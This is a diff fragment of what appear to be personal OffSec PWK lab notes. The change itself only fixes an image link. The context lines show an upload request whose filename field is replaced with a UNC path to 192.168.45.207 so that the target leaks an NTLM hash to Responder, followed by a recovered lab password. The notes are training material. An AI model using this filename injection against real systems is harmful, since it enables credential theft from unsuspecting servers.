@@ -304,7 +304,7 @@ In the post request for our simple upload.. we can modify the following :
 Content-Disposition: form-data; name="myFile"; filename="\\\\192.168.45.207\\test"
 This provided the hash in responder
 
-![[1633-Q2.png]]
+![](91-Courses/00-Offsec-PWK/assets/1633-Q2.png)
 
 Password is : sam:DISISMYPASSWORD
 
